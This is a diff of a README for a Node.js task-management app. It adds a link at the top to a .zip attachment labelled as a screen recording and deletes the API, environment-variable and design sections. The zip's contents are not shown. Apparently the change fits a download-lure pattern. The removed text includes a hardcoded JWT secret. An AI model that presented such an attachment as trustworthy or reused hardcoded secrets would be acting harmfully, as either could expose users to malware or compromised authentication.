@@ -1,3 +1,6 @@
+[Screen Recording 2026-11-05 205329.zip](https://github.com/user-attachments/files/34433148/Screen.Recording.2026-11-05.205329.zip)
+
+
 # Task Master — Full-Stack Project & Task Management Platform
 
 [![Node.js](https://img.shields.io/badge/Node.js-v20-339933?logo=nodedotjs&logoColor=white)](https://nodejs.org/)
@@ -165,55 +168,4 @@ npm run dev
 ```
 
 ---
-
-## 📡 API Reference
-
-### Authentication (`/api/auth`)
-
-| Method | Endpoint | Access | Request Body | Description |
-|---|---|---|---|---|
-| `POST` | `/api/auth/register` | Public | `{ name, email, password }` | Register new user; returns JWT token & user object |
-| `POST` | `/api/auth/login` | Public | `{ email, password }` | Authenticate user; returns JWT token & user object |
-| `GET` | `/api/auth/me` | Private | *None* | Get current authenticated user profile |
-
-### Task Management (`/api/tasks`)
-*All task routes require the `Authorization: Bearer <TOKEN>` header.*
-
-| Method | Endpoint | Access | Query / Body Parameters | Description |
-|---|---|---|---|---|
-| `POST` | `/api/tasks` | Private | `{ title, description, priority, dueDate, estimatedHours }` | Create a new task linked to `req.userId` |
-| `GET` | `/api/tasks` | Private | `?status=&priority=&search=&page=&limit=` | Retrieve tasks for current user |
-| `GET` | `/api/tasks/:id` | Private | Path param `:id` | Get single task by ID (ensures ownership) |
-| `PUT` | `/api/tasks/:id` | Private | `{ title, description, status, priority, dueDate, estimatedHours }` | Update task fields & status |
-| `DELETE` | `/api/tasks/:id` | Private | Path param `:id` | Delete task by ID |
-
----
-
-## ⚙️ Environment Variables
-
-Located in `task-master-api/.env`:
-
-```env
-# Server Port & Environment
-PORT=5000
-NODE_ENV=development
-
-# Database Connection URI
-# Local MongoDB:
-MONGO_URI=mongodb://localhost:27017/taskmaster
-# Docker Compose:
-# MONGO_URI=mongodb://mongo:27017/taskmaster
-
-# JWT Authentication Secrets
-JWT_SECRET=supersecretjwtkey_taskmaster_production_safe_token_987654321
-JWT_EXPIRES_IN=7d
-```
-
----
-
-## 🎨 Design Philosophy
-
-- **Zero AI Bloat**: No heavy card dropshadows, excessive glow effects, or decorative gradients.
-- **Color Palette**: Crisp Light Blue (`#E8F0FE`, `#E3F2FD`, `#F4F8FB`) paired with Pure White (`#FFFFFF`) and dark gray text (`#1F2937`) for optimal accessibility and readability.
-- **Fast & Responsive**: Clean 1px solid borders (`#D1E3F8`) and instant tactile hover transitions.
 
